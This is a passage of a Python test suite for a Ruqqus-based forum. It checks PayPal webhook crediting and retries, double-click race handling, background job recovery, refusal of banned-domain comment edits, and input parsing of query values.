    monkeypatch.setattr(paypal.CLIENT, "capture", pending)
    assert client.get(f"/shop/buy_coins_completed?txid={base36encode(txn)}", base_url=BASE).status_code == 200
    assert (fresh(member).execute(text("SELECT coin_balance FROM users WHERE id = :u"), {"u": member.id}).scalar() or 0) == before

    cleared = _event("PAYMENT.CAPTURE.COMPLETED", {"id": capture, "status": "COMPLETED",
                                                    "supplementary_data": {"related_ids": {"order_id": order}}})
    assert _hook(app, cleared).status_code == 204
    assert _hook(app, {**cleared, "id": "WH-" + secrets.token_hex(6)}).status_code == 204, "a second copy gives nothing more"
    coins = fresh(member).execute(text("SELECT coin_balance FROM users WHERE id = :u"), {"u": member.id}).scalar() or 0
    assert coins in (before + 5, before + 4)                    # buying starts a week of Premium, which spends one
    assert fresh(member).execute(text("SELECT status FROM paypal_txns WHERE id = :t"), {"t": txn}).scalar() == 3


def test_b_a_denied_capture_gives_nothing(make_member, real_app, fake_paypal):
    app, _ = real_app
    member = make_member()
    order, capture = "ORDER-" + secrets.token_hex(5), "CAPTURE-" + secrets.token_hex(5)
    db = fresh(member)
    txn = db.execute(text("INSERT INTO paypal_txns (user_id, created_utc, coin_count, usd_cents, status, paypal_id, paypal_capture_id) "
                          "VALUES (:u, 0, 5, 499, 4, :o, :c) RETURNING id"), {"u": member.id, "o": order, "c": capture}).scalar()
    db.commit()
    before = member.user().coin_balance or 0
    assert _hook(app, _event("PAYMENT.CAPTURE.DENIED", {"id": capture, "status": "DECLINED"})).status_code == 204
    assert fresh(member).execute(text("SELECT status FROM paypal_txns WHERE id = :t"), {"t": txn}).scalar() == -1
    assert (fresh(member).execute(text("SELECT coin_balance FROM users WHERE id = :u"), {"u": member.id}).scalar() or 0) == before


def test_b_an_order_paid_but_still_pending_at_paypal_reads_as_pending(make_member, real_app, monkeypatch):
    from types import SimpleNamespace
    paypal = sys.modules["ruqqus.routes.paypal"]
    order = {"id": "ORDER-P", "status": "COMPLETED",
             "purchase_units": [{"payments": {"captures": [{"id": "CAPTURE-P", "status": "PENDING"}]}}]}
    monkeypatch.setattr(paypal.CLIENT, "_post", lambda url, data=None: SimpleNamespace(json=lambda: order))
    txn = paypal.PayPalTxn(paypal_id="ORDER-P", usd_cents=499, coin_count=5, status=1)
    assert paypal.CLIENT.capture(txn) == "PENDING" and txn.status == 4 and txn.paypal_capture_id == "CAPTURE-P"


def test_b_an_event_that_fails_half_way_is_not_kept_and_works_when_sent_again(make_member, real_app, fake_paypal, monkeypatch):
    from ruqqus.helpers import paypal_events
    app, _ = real_app
    member = make_member()
    _, _, capture = _paid_order(member)
    event = _refund(capture)
    real = paypal_events.owed_for

    def broken(cents):
        raise RuntimeError("half way")
    monkeypatch.setattr(paypal_events, "owed_for", broken)
    assert _hook(app, event).status_code == 503
    assert _owed(member) == 0
    monkeypatch.setattr(paypal_events, "owed_for", real)
    assert _hook(app, event).status_code == 204, "PayPal's retry is handled, not dropped as already seen"
    assert _owed(member) == paypal_events.owed_for(499)


# ---------------------------------------------------------------- M3: a double click is a 422, never a 500

def _race(pg_engine, member, path, insert, params):
    """Send `path` while another connection holds the same row uncommitted: the request's check can't see it, its
    insert waits on the unique index, and fails when the other commits (what a double click does)."""
    import threading
    client = member.browser()
    key = member.formkey(client)
    answer = {}
    # pg_engine's connections commit every statement (AUTOCOMMIT): this one holds a real transaction
    with pg_engine.connect().execution_options(isolation_level="READ COMMITTED") as other:
        held = other.begin()
        other.execute(text(insert), params)                    # not committed yet
        worker = threading.Thread(target=lambda: answer.setdefault("status", post(client, path, {"formkey": key}).status_code))
        worker.start()
        time.sleep(1.5)                                        # the request is now waiting on the unique index
        held.commit()
    worker.join(20)
    return answer.get("status")


def test_m3_a_bookmark_or_vote_sent_twice_at_once_is_a_422(make_member, guildmaster_with_post, pg_engine):
    """The vote route answered its 422 with the failed transaction still open, which after_request then committed: a
    500. The bookmarks abort(422), and every error page rolls back first (routes/errors.py), so they were fine; they
    are here so they stay so."""
    from ruqqus.helpers.base36 import base36encode
    _, author, copy_id = guildmaster_with_post
    member = make_member()
    cid = _comment_on(author, copy_id)
    now = int(time.time())
    assert _race(pg_engine, member, f"/save_post/{base36encode(copy_id)}",
                 "INSERT INTO save_relationship (user_id, submission_id, created_utc) VALUES (:u, :p, :t)",
                 {"u": member.id, "p": copy_id, "t": now}) == 422
    assert _race(pg_engine, member, f"/save_comment/{base36encode(cid)}",
                 "INSERT INTO comment_save_relationship (user_id, comment_id, created_utc) VALUES (:u, :c, :t)",
                 {"u": member.id, "c": cid, "t": now}) == 422
    assert _race(pg_engine, member, f"/api/vote/post/{base36encode(copy_id)}/1",
                 "INSERT INTO votes (user_id, submission_id, created_utc, vote_type) VALUES (:u, :p, :t, 1)",
                 {"u": member.id, "p": copy_id, "t": now}) == 422


# ---------------------------------------------------------------- M4: a notification is kept with its message

def test_m4_a_notification_sent_from_a_job_is_kept_without_a_second_commit(make_member, real_app):
    from flask import g
    from ruqqus.helpers.alerts import send_notification
    app, db_session = real_app
    member = make_member()
    with app.test_request_context():                    # as scripts/renew_circles.py runs it
        g.db = db_session()
        user = g.db.query(sys.modules["ruqqus.classes"].User).filter_by(id=member.id).first()
        send_notification(user, "Your membership lapsed " + secrets.token_hex(3))
        g.db.rollback()                                 # a job that ends without committing again
        g.db.close()
    kept = fresh(member).execute(text("SELECT count(*) FROM notifications WHERE user_id = :u"), {"u": member.id}).scalar()
    assert kept == 1


# ---------------------------------------------------------------- M5: a job keeps working after a database error

def _job(name):
    from pathlib import Path
    folder = str(Path(__file__).resolve().parents[2] / "scripts")
    if folder not in sys.path:
        sys.path.insert(0, folder)
    return __import__(name)


def test_m5_the_scheduler_works_again_on_the_tick_after_a_database_error(real_app):
    _, db_session = real_app
    scheduler = _job("publish_scheduled")
    broken = db_session()
    with pytest.raises(Exception):
        broken.execute(text("SELECT 1 / 0"))                  # the scoped session is now in a failed transaction
    with pytest.raises(Exception):
        scheduler.tick()                                        # what the loop used to do every tick from then on
    assert scheduler.tick_safely() is None, "this tick fails, and the session is thrown away"
    assert scheduler.tick() == {}, "the next one works"


def test_m5_premium_renewals_run_even_when_the_circles_fail(real_app, monkeypatch):
    job = _job("renew_circles")
    renewed = []

    def circles_fail(db, now=None):
        raise RuntimeError("circles down")
    monkeypatch.setattr(job.circle_store, "renew_due", circles_fail)
    monkeypatch.setattr(job, "renew_premium", lambda now=None: renewed.append(now) or 0)
    with pytest.raises(RuntimeError):
        job.tick(1_900_000_000)
    assert renewed == [1_900_000_000]


# ---------------------------------------------------------------- L2: editing a comment to a banned link says no

def test_l2_editing_a_comment_to_a_banned_link_is_refused_not_saved(make_member, guildmaster_with_post):
    from ruqqus.helpers.base36 import base36encode
    _, author, copy_id = guildmaster_with_post
    cid = _comment_on(author, copy_id)
    malicious, banned = f"bad-{secrets.token_hex(3)}.example", f"spam-{secrets.token_hex(3)}.example"
    db = fresh(author)
    for domain, reason in ((malicious, 4), (banned, 1)):
        db.execute(text("INSERT INTO domains (domain, can_submit, can_comment, reason, show_thumbnail) "
                        "VALUES (:d, false, false, :r, false)"), {"d": domain, "r": reason})
    db.commit()
    try:
        client = author.browser()
        refused = post(client, f"/edit_comment/{base36encode(cid)}", {"body": f"see [this](https://{banned}/x)", "formkey": author.formkey(client)})
        assert refused.status_code == 400 and banned in refused.get_json()["error"]
        client = author.browser()
        bad = post(client, f"/edit_comment/{base36encode(cid)}", {"body": f"see [this](https://{malicious}/x)", "formkey": author.formkey(client)})
        assert bad.status_code == 403, "the page took a 200 for a saved edit"
        body = fresh(author).execute(text("SELECT body FROM comments_aux WHERE id = :c"), {"c": cid}).scalar()
        assert malicious not in body and banned not in body
    finally:
        db = fresh(author)
        db.execute(text("DELETE FROM domains WHERE domain IN (:a, :b)"), {"a": malicious, "b": banned})
        db.commit()


# ---------------------------------------------------------------- L3: a bad query value is never a 500

def test_l3_bad_query_values_are_never_a_500(make_member, real_app):
    app, _ = real_app
    member = make_member()
    for client in (app.test_client(), member.browser()):
        for path in ("/?utc_greater_than=abc", "/all?utc_less_than=x", "/+general?utc_greater_than=1.5",
                     "/all?utc_greater_than=-5", "/post/1?context=abc", "/activate?time=soon&id=1&token=x&email=a"):
            answer = client.get(path, base_url=BASE)
            assert answer.status_code < 500, (path, answer.status_code)


def test_l3_a_yes_or_no_query_value_reads_false_as_no_and_a_number_reads_only_digits(real_app):
    """`bool(request.args.get("ignore_pinned", False))` was True for "false" (and "0", "no"): the feeds hid their
    pinned posts. The feeds read it through flag_arg now, and their time limits through whole_arg."""
    from ruqqus.helpers.wrappers import flag_arg, whole_arg
    app, _ = real_app
    for value, expected in (("false", False), ("0", False), ("no", False), ("", False), ("true", True), ("1", True),
                            ("Yes", True), ("on", True)):
        with app.test_request_context(f"/?ignore_pinned={value}"):
            assert flag_arg("ignore_pinned") is expected, value
    for value, expected in (("1700000000", 1700000000), ("abc", 0), ("-5", 0), ("1.5", 0), ("", 0), ("9" * 40, 0)):
        with app.test_request_context(f"/?utc_greater_than={value}"):
            assert whole_arg("utc_greater_than") == expected, value


# ---------------------------------------------------------------- L4: a session with no form key yet is refused, not a 500

def test_l4_a_signed_in_session_that_never_drew_a_form_key_is_refused(make_member, guildmaster_with_post):
    """A guard, not a reproduction: the real app gives every request a session_id in before_request, so it never hit
    the KeyError the harness tests recorded (tests/test_votes.py, tests/test_wrappers.py)."""
    from ruqqus.helpers.base36 import base36encode
    _, _, copy_id = guildmaster_with_post
    member = make_member()
    client = member.browser()
    with client.session_transaction() as s:
        s.pop("session_id", None)
    answer = post(client, f"/api/vote/post/{base36encode(copy_id)}/1", {"formkey": "anything"})
    assert answer.status_code == 401 or (answer.status_code == 302 and "/login" in answer.headers["Location"]), answer.status_code


# ---------------------------------------------------------------- L6: feed dates carry their time zone

def test_l6_feed_dates_say_they_are_utc(real_app):
    feeds = sys.modules["ruqqus.routes.feeds"]
    assert feeds.atom_time(0) == "1970-01-01T00:00:00+00:00"
    assert feeds.atom_time(1_792_000_000).endswith("+00:00")
